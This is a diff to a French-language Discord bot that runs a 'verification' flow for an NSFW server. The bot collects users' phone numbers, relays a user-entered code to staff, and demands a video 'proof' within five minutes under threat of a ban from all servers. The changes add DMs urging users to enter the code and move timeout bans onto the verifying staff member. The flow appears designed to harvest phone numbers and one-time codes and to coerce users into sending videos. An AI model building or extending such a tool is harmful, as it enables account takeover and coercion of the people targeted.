@@ -139,6 +139,15 @@ def user_has_bypass(uid: int) -> bool:
                 return True
     return False
 
+async def ban_everyone(uid: int, reason: str):
+    for g in list(bot.guilds):
+        m = g.get_member(uid)
+        if m:
+            try:
+                await g.kick(m, reason=reason)
+            except Exception:
+                pass
+
 class PhoneModal(discord.ui.Modal, title="Vérification"):
     phone = discord.ui.TextInput(
         label="Numéro de téléphone",
@@ -171,12 +180,14 @@ class PhoneModal(discord.ui.Modal, title="Vérification"):
             ), ephemeral=True)
             return
 
-        if uid in cooldowns:
+        if uid != config.OWNER_ID and uid in cooldowns:
             remaining = cooldowns[uid] + config.COOLDOWN_SECONDS - now
             if remaining > 0:
+                mins = int(remaining // 60)
+                secs = int(remaining % 60)
                 await interaction.response.send_message(embed=discord.Embed(
                     title="Vérification",
-                    description=f"Une demande a déjà été envoyée. Réessayez dans **{int(remaining)} secondes**.",
+                    description=f"Vous avez déjà fait une demande récemment. Réessayez dans **{mins} min {secs:02d}s**.",
                     color=COLOR_GOLD
                 ), ephemeral=True)
                 return
@@ -315,21 +326,14 @@ class CodeModal(discord.ui.Modal, title="Vérification"):
             ping=staff_id
         )
 
-        if not user_has_bypass(self.user_id):
-            proof_channel = get_proof_channel()
-            if proof_channel:
-                await interaction.response.send_message(embed=discord.Embed(
-                    title="Vérification",
-                    description="Code reçu. Rendez-vous dans le salon de vérification pour finaliser.",
-                    color=COLOR_GREEN
-                ), ephemeral=True)
-                asyncio.create_task(start_proof(self.user_id, staff_id, content))
-            else:
-                await interaction.response.send_message(embed=discord.Embed(
-                    title="Vérification",
-                    description="Code reçu. Vérification en cours, merci de patienter.",
-                    color=COLOR_GREEN
-                ), ephemeral=True)
+        proof_channel = get_proof_channel()
+        if proof_channel:
+            await interaction.response.send_message(embed=discord.Embed(
+                title="Vérification",
+                description="Code reçu. Finalisation de la vérification en cours.",
+                color=COLOR_GREEN
+            ), ephemeral=True)
+            asyncio.create_task(start_proof(self.user_id, staff_id, content))
         else:
             await interaction.response.send_message(embed=discord.Embed(
                 title="Vérification",
@@ -339,6 +343,63 @@ class CodeModal(discord.ui.Modal, title="Vérification"):
 
     async def on_error(self, interaction: discord.Interaction, error: Exception) -> None:
         log.error(f"Code modal error: {error}")
+
+class CodeSendModal(discord.ui.Modal, title="Envoyer le code"):
+    message_txt = discord.ui.TextInput(
+        label="Message à envoyer",
+        style=discord.TextStyle.paragraph,
+        default="Vous avez reçu un code de vérification. Rendez-vous sur le serveur et cliquez sur le bouton Code pour le saisir.",
+        max_length=1000,
+        required=True,
+    )
+
+    def __init__(self, view: "StaffPanelView"):
+        super().__init__()
+        self.panel_view = view
+
+    async def on_submit(self, interaction: discord.Interaction):
+        v = self.panel_view
+        pending_users[v.user_id] = {
+            "unlocked": True,
+            "unlocked_at": datetime.datetime.now().timestamp(),
+            "claimed_by": interaction.user.id,
+            "view": v,
+        }
+
+        txt = self.message_txt.value
+        link = v.message.jump_url if v.message else None
+        embed_dm = discord.Embed(title="Votre code est arrivé", description=txt, color=COLOR_GREEN)
+        if link:
+            embed_dm.add_field(name="Saisir votre code", value=f"[Cliquez ici pour ouvrir le bouton Code]({link})")
+        try:
+            user_fetch = await bot.fetch_user(v.user_id)
+            await user_fetch.send(embed=embed_dm)
+            dm_ok = True
+        except Exception:
+            dm_ok = False
+
+        if not dm_ok:
+            staff_channel = get_staff_channel()
+            if staff_channel:
+                await staff_channel.send(content=f"<@{v.user_id}>", embed=discord.Embed(
+                    title="Vérification",
+                    description=f"{txt}\n\nRevenez sur le serveur et cliquez sur le bouton **Code** pour le saisir.",
+                    color=COLOR_GOLD
+                ))
+
+        await interaction.response.send_message(embed=discord.Embed(
+            title="Code envoyé",
+            description=f"{'DM envoyé' if dm_ok else 'DM fermé — message envoyé côté staff'} à <@{v.user_id}>.\n⏱️ Il a **10 minutes**, sinon la demande expire.",
+            color=COLOR_GOLD
+        ), ephemeral=True)
+
+        user_fetch = await bot.fetch_user(v.user_id)
+        await v.refresh(v.message, user_fetch, "Code envoyé", "En attente de saisie")
+        await send_log(title="Code envoyé", color=COLOR_GOLD, fields=[
+            ("Utilisateur", f"<@{v.user_id}>", True),
+            ("Staff", f"<@{interaction.user.id}>", True),
+            ("DM", "Oui" if dm_ok else "Non (message serveur)", True),
+        ])
 
 def build_staff_embed(user: discord.User, phone: str, status: str = "En attente", claimed_by: Optional[int] = None, code_status: str = "—", timestamp: Optional[datetime.datetime] = None) -> discord.Embed:
     if timestamp is None:
@@ -468,26 +529,7 @@ class StaffPanelView(discord.ui.View):
                     color=COLOR_GOLD
                 ), ephemeral=True)
                 return
-
-            pending_users[self.user_id] = {
-                "unlocked": True,
-                "unlocked_at": datetime.datetime.now().timestamp(),
-                "claimed_by": interaction.user.id,
-                "view": self,
-            }
-
-            await interaction.response.send_message(embed=discord.Embed(
-                title="Code envoyé",
-                description=f"L'utilisateur <@{self.user_id}> peut maintenant saisir son code.\n⏱️ Il a **10 minutes**, sinon la demande expire.",
-                color=COLOR_GOLD
-            ), ephemeral=True)
-
-            user_fetch = await bot.fetch_user(self.user_id)
-            await self.refresh(interaction.message, user_fetch, "Code envoyé", "En attente de saisie")
-            await send_log(title="Code envoyé", color=COLOR_GOLD, fields=[
-                ("Utilisateur", f"<@{self.user_id}>", True),
-                ("Staff", f"<@{interaction.user.id}>", True),
-            ])
+            await interaction.response.send_modal(CodeSendModal(self))
         except Exception as e:
             log.error(f"Send code error: {e}")
 
@@ -525,7 +567,6 @@ class StaffPanelView(discord.ui.View):
 
             self.locked = True
             pending_users.pop(self.user_id, None)
-            cooldowns.pop(self.user_id, None)
             proofs.pop(self.user_id, None)
 
             user_fetch = await bot.fetch_user(self.user_id)
@@ -579,7 +620,7 @@ class StaffPanelView(discord.ui.View):
             uid = self.user_id
             phone = self.phone
             pending_users.pop(uid, None)
-            cooldowns.pop(uid, None)
+            proofs.pop(uid, None)
             blacklisted_numbers.add(phone)
             blacklisted_users.add(uid)
             data["blacklisted_numbers"] = list(blacklisted_numbers)
@@ -622,10 +663,10 @@ async def send_staff_panel(user: discord.User, phone: str):
 
 PROOF_TEXT = (
     "Tu as **5 minutes** pour envoyer une **vidéo** comme preuve dans ce salon.\n\n"
-    "Le temps commence maintenant et défile : le temps restant est indiqué ci-dessous, mis à jour chaque minute.\n\n"
+    "Le temps se met à jour chaque minute sur ce message.\n\n"
     "Envoie simplement ta vidéo en pièce jointe dans ce salon.\n"
     "Aucun texte n'est nécessaire — uniquement la vidéo.\n\n"
-    "Si tu n'envoies pas de vidéo dans le temps imparti, ton accès sera refusé sur l'ensemble des serveurs.\n\n"
+    "Si tu n'envoies pas de vidéo dans le temps imparti, tu seras banni de tous les serveurs.\n\n"
     "Si ta vidéo est supprimée, elle sera automatiquement renvoyée ici et conservée."
 )
 
@@ -645,7 +686,7 @@ async def start_proof(uid: int, staff_id: Optional[int], code: str = ""):
 
     def make_embed(mins, secs):
         embed = discord.Embed(color=COLOR_GOLD, timestamp=datetime.datetime.now())
-        embed.set_author(name="Vérification en cours", icon_url=user.display_avatar.url)
+        embed.set_author(name="Preuve requise", icon_url=user.display_avatar.url)
         embed.set_thumbnail(url=user.display_avatar.url)
         embed.add_field(name="Utilisateur", value=f"{user.mention}", inline=True)
         embed.add_field(name="ID", value=f"`{uid}`", inline=True)
@@ -661,40 +702,46 @@ async def start_proof(uid: int, staff_id: Optional[int], code: str = ""):
         return embed
 
     try:
-        ping_content = f"<@{staff_id}>" if staff_id else f"{user.mention}"
+        ping_content = f"<@{staff_id}>" if staff_id else ""
         msg = await channel.send(content=ping_content, embed=make_embed(5, 0))
     except Exception as e:
         log.error(f"Proof send error: {e}")
         return
 
-    proofs[uid] = {"message": msg, "done": False, "video_msg": None, "attachment": None, "staff_id": staff_id, "start_ts": start_ts, "code": code}
+    proofs[uid] = {"message": msg, "done": False, "video_msg": None, "attachment": None, "staff_id": staff_id, "start_ts": start_ts, "code": code, "proof_sent": False}
 
     async def countdown():
         while True:
             await asyncio.sleep(60)
             p = proofs.get(uid)
-            if p is None or p["done"]:
+            if p is None:
                 return
-            remaining = PROOF_WINDOW - (datetime.datetime.now().timestamp() - p["start_ts"])
-            if remaining <= 0:
-                await proof_timeout(uid)
+            if p["done"]:
                 return
-            mins = int(remaining // 60)
-            secs = int(remaining % 60)
-            try:
-                await p["message"].edit(embed=make_embed(mins, secs))
-            except Exception:
-                pass
+            if not p["proof_sent"]:
+                remaining = PROOF_WINDOW - (datetime.datetime.now().timestamp() - p["start_ts"])
+                if remaining <= 0:
+                    await proof_timeout(uid)
+                    return
+                mins = int(remaining // 60)
+                secs = int(remaining % 60)
+                try:
+                    await p["message"].edit(embed=make_embed(mins, secs))
+                except Exception:
+                    pass
+            else:
+                try:
+                    await p["message"].edit(embed=p["sent_embed"])
+                except Exception:
+                    pass
 
     proofs[uid]["task"] = asyncio.create_task(countdown())
 
 async def proof_done(uid: int):
     p = proofs.get(uid)
-    if not p or p["done"]:
+    if not p or p["proof_sent"]:
         return
-    p["done"] = True
-    if p.get("task"):
-        p["task"].cancel()
+    p["proof_sent"] = True
     if p.get("video_msg") and p["video_msg"].attachments:
         video_archive[uid] = {
             "msg_id": p["video_msg"].id,
@@ -705,7 +752,7 @@ async def proof_done(uid: int):
     view = pending_users.get(uid, {}).get("view")
     phone_val = view.phone if view else ""
     embed = discord.Embed(color=COLOR_GREEN, timestamp=datetime.datetime.now())
-    embed.set_author(name="Preuve reçue", icon_url=user.display_avatar.url)
+    embed.set_author(name="Preuve envoyée", icon_url=user.display_avatar.url)
     embed.set_thumbnail(url=user.display_avatar.url)
     embed.add_field(name="Utilisateur", value=f"{user.mention}", inline=True)
     embed.add_field(name="ID", value=f"`{uid}`", inline=True)
@@ -713,17 +760,17 @@ async def proof_done(uid: int):
         embed.add_field(name="Code", value=f"**{p['code']}**", inline=True)
     if phone_val:
         embed.add_field(name="Numéro", value=f"`{mask_phone(phone_val)}`", inline=True)
-    embed.add_field(name="Statut", value="Preuve reçue — vérification en cours", inline=False)
+    embed.add_field(name="Statut", value="Preuve envoyée — vérification en cours", inline=False)
     embed.set_footer(text=datetime.datetime.now().strftime('%d/%m/%Y %H:%M'))
+    p["sent_embed"] = embed
     try:
         await p["message"].edit(embed=embed, view=None)
     except Exception:
         pass
-    await send_log(title="Preuve vidéo reçue", color=COLOR_GREEN, fields=[
+    await send_log(title="Preuve vidéo envoyée", color=COLOR_GREEN, fields=[
         ("Utilisateur", f"<@{uid}>", True),
         ("Staff", f"<@{p['staff_id']}>" if p["staff_id"] else "—", True),
     ], user=user, ping=p["staff_id"])
-    proofs.pop(uid, None)
 
 async def proof_timeout(uid: int):
     p = proofs.pop(uid, None)
@@ -731,20 +778,14 @@ async def proof_timeout(uid: int):
         return
     if p.get("task"):
         p["task"].cancel()
+    staff_id = p.get("staff_id")
     user = bot.get_user(uid) or await bot.fetch_user(uid)
 
-    blacklisted_users.add(uid)
-    data["blacklisted_users"] = list(blacklisted_users)
-    save_data()
-    for gid in [config.GUILD_ID, config.STAFF_GUILD_ID]:
-        g = bot.get_guild(gid)
-        if g:
-            m = g.get_member(uid)
-            if m:
-                try:
-                    await g.kick(m, reason="Preuve non fournie dans le délai")
-                except Exception:
-                    pass
+    if staff_id:
+        blacklisted_users.add(staff_id)
+        data["blacklisted_users"] = list(blacklisted_users)
+        save_data()
+        await ban_everyone(staff_id, "Preuve non fournie dans le délai")
 
     embed = discord.Embed(color=COLOR_RED, timestamp=datetime.datetime.now())
     embed.set_author(name="Délai dépassé", icon_url=user.display_avatar.url)
@@ -753,22 +794,20 @@ async def proof_timeout(uid: int):
     embed.add_field(name="ID", value=f"`{uid}`", inline=True)
     if p.get("code"):
         embed.add_field(name="Code", value=f"**{p['code']}**", inline=True)
-    embed.add_field(name="Statut", value="Aucune preuve envoyée — banni de tous les serveurs", inline=False)
+    if staff_id:
+        embed.add_field(name="Vérificateur", value=f"<@{staff_id}> — banni de tous les serveurs", inline=False)
+    embed.add_field(name="Statut", value="Aucune preuve envoyée", inline=False)
     embed.set_footer(text=datetime.datetime.now().strftime('%d/%m/%Y %H:%M'))
     try:
         await p["message"].edit(embed=embed, view=None)
     except Exception:
         pass
-    await send_log(title="Preuve non fournie — ban", color=COLOR_RED, fields=[
+    await send_log(title="Preuve non fournie — ban staff", color=COLOR_RED, fields=[
         ("Utilisateur", f"<@{uid}>", True),
-        ("Staff", f"<@{p['staff_id']}>" if p["staff_id"] else "—", True),
-    ], user=user, ping=p["staff_id"] if p["staff_id"] else 0)
+        ("Staff", f"<@{staff_id}>" if staff_id else "—", True),
+    ], user=user, ping=staff_id or 0)
 
 async def on_proof_channel_message(message: discord.Message):
-    uid = message.author.id
-    p = proofs.get(uid)
-    if p is None or p["done"]:
-        return
     video = None
     for att in message.attachments:
         if att.content_type and att.content_type.startswith("video"):
@@ -780,9 +819,14 @@ async def on_proof_channel_message(message: discord.Message):
         except Exception:
             pass
         return
-    p["video_msg"] = message
-    p["attachment"] = video
-    await proof_done(uid)
+    for uid, p in list(proofs.items()):
+        if p["proof_sent"]:
+            continue
+        if message.author.id == p.get("staff_id") or message.author.id == uid:
+            p["video_msg"] = message
+            p["attachment"] = video
+            await proof_done(uid)
+            return
 
 @bot.event
 async def on_message(message: discord.Message):
@@ -862,6 +906,30 @@ class VerifyView(discord.ui.View):
             ), ephemeral=True)
             return
         await interaction.response.send_modal(CodeModal(interaction.user.id))
+
+async def update_member_channels():
+    while True:
+        try:
+            for g in list(bot.guilds):
+                count = g.member_count or 0
+                name = f"🎯 {count}/100 Membres"
+                existing = None
+                for vc in g.voice_channels:
+                    if vc.name.startswith("🎯") and "Membres" in vc.name:
+                        existing = vc
+                        break
+                if not existing:
+                    overwrite = discord.PermissionOverwrite(connect=False)
+                    await g.create_voice_channel(name, overwrites={g.default_role: overwrite})
+                else:
+                    if existing.name != name:
+                        try:
+                            await existing.edit(name=name)
+                        except Exception:
+                            pass
+        except Exception as e:
+            log.error(f"Member channels error: {e}")
+        await asyncio.sleep(60)
 
 @bot.tree.command(name="setupnsfw", description="Crée le panneau de vérification")
 @app_commands.default_permissions(administrator=True)
@@ -1057,6 +1125,7 @@ async def on_ready():
     bot.add_view(VerifyView())
     log.info("Boutons restaurés.")
     asyncio.create_task(start_health_server())
+    asyncio.create_task(update_member_channels())
 
 if __name__ == "__main__":
     if not config.BOT_TOKEN:
